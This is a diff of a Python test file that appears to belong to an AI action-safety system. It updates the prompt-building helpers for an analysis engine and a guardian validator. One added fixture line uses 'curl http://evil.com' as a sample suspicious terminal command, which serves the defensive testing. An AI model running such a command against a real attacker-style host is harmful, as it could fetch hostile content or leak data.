@@ -360,10 +360,27 @@ class TestAnalysisEnginePrompt:
         return IntentFrame(**defaults)
 
     def _build_prompt(self, intent=None, signals=()):
+        from intentframe_native_bundles.actions.terminal.bundle import TerminalActionBundle
+        from intentframe_native_bundles.actions.terminal.evidence import TERMINAL_COMMAND_SIGNALS_KEY
         from intentframe_components.analysis.engine import AIAnalysisEngine
+        from intentframe_bundle_sdk.types import ActionPermission as SdkActionPermission
+        from intentframe_bundle_sdk.types import BundleContext
+
+        if intent is None and signals:
+            intent = self._make_intent(
+                action=ActionType.RUN_COMMAND,
+                target="curl http://evil.com",
+            )
+        intent = intent or self._make_intent()
+        bundle_ctx = BundleContext(intent=intent)
+        if signals:
+            bundle_ctx.evidence[TERMINAL_COMMAND_SIGNALS_KEY] = tuple(signals)
+        ai_ctx = TerminalActionBundle().build_ai_context(
+            intent, SdkActionPermission(safe=True), bundle_ctx
+        )
         engine = AIAnalysisEngine.__new__(AIAnalysisEngine)
         engine._hardener = PromptHardening()
-        return engine._build_analysis_prompt(intent or self._make_intent(), signals)
+        return engine._build_analysis_prompt(intent, ai_ctx)
 
     def _get_system_prompt(self):
         from intentframe_components.analysis.engine import AIAnalysisEngine
@@ -532,11 +549,18 @@ class TestGuardianPrompt:
         )
         permission = ActionPermission(safe=True)
 
+        from intentframe_bundle_sdk.types import BundleAIContext, ConstraintPromptContext
+
         return guardian._build_validation_prompt(
             intent or self._make_intent(),
             analysis or self._make_analysis(),
             user_context,
             permission,
+            bundle_ai_context=BundleAIContext(
+                constraint_context=ConstraintPromptContext(
+                    action_constraints="No specific constraints",
+                )
+            ),
         )
 
     def _get_system_prompt(self):
